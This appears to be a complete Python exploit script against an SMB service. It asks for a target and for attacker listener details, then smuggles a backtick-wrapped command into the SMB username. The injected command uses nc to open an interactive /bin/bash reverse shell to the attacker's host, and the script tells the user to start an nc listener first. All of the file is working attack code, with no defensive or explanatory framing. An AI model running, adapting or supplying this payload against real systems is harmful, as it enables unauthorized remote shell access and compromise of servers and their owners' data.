import sys
import time
from smb.SMBConnection import SMBConnection

target = input("Please enter the target ip eg(255.255.255.255):")
target_port = input("Please enter the target port eg(139):")
lhost = input("Please enter the LHOST: ")
lport = input("Please enter the LPORT: ")
print(
    f"""
--------------------------------------
Target     : {target}
Target Port: {target_port}
LHOST	   : {lhost}
LPORT      : {lport}
--------------------------------------
"""
)
choose = input("Is this correct? [y/n]:")
if choose == 'y' or choose == 'Y':
    print(f"\n\nPlease run 'nc -lnvp {lport}' in another terminal")
    time.sleep(1)
    choose2 = input("Did you execute it? [y/n]: ")
    if choose2 == 'y' or choose2 == 'Y':
        payload = '`'+f"nc {lhost} {lport} -c 'exec /bin/bash -i 2>&1'"+'`'
        conn = SMBConnection(payload, "tabun", "tabun", "tabun")
        conn.connect(target, target_port)
    else:
        print("Start your listener and try again...")
        time.sleep(0.5)
        sys.exit()
else:
    print("Exiting...")
    time.sleep(0.5)
    sys.exit()